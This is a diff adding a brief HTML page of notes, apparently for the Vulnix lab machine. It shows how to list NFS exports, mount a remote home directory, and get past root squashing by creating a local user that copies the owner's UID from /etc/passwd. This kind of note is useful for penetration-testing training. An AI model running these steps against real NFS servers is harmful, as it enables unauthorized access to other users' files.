@@ -1,0 +1,27 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Manual</title>
+</head><body><b>Show NFS server mount information<br/>
+</b><br/>
+<tt>showmount --exports 192.168.1.33<br/>
+<br/>
+</tt><b>Mounting remote export<br/>
+</b><tt><br/>
+</tt><tt>mkdir /tmp/nfs</tt><b><br/>
+</b><tt>mount -t nfs 192.168.1.33:/home/vulnix /tmp/nfs<br/>
+</tt><br/>
+If we don't have permission to access /tmp/nfs then root squashing is enabled<tt><br/>
+</tt><br/>
+In order to RW into the mounted export we need to find out original exported dir owner UID and GID<br/>
+and create such user on our system.<br/>
+<br/>
+<b>Original user from /etc/passwd</b><br/>
+<tt><br/>
+</tt><tt>vulnix:x:2008:2008::/home/vulnix:/bin/bash</tt><br/>
+<br/>
+<b>Creating original user clone on our machine and log into the export<br/>
+</b><tt><br/>
+useradd -u 2008 vulnix<br/>
+su vulnix<br/>
+cd /tmp/nfs</tt></body></html>
